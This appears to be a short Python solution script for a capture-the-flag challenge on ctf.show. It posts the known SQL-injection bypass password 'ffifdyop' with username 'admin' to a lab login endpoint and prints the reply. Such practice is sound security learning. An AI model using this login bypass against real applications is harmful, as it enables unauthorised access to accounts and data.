import requests

url = 'http://ba40e41c-7293-4031-bc46-860fbc112f03.challenge.ctf.show/select-waf.php'
url2 = ' http://ba40e41c-7293-4031-bc46-860fbc112f03.challenge.ctf.show/api/'

payload = {
    "username":"admin",
    "password":"ffifdyop"
}

#r = requests.post(url=url,data=payload)
res = requests.post(url=url2,data=payload).text

print(res)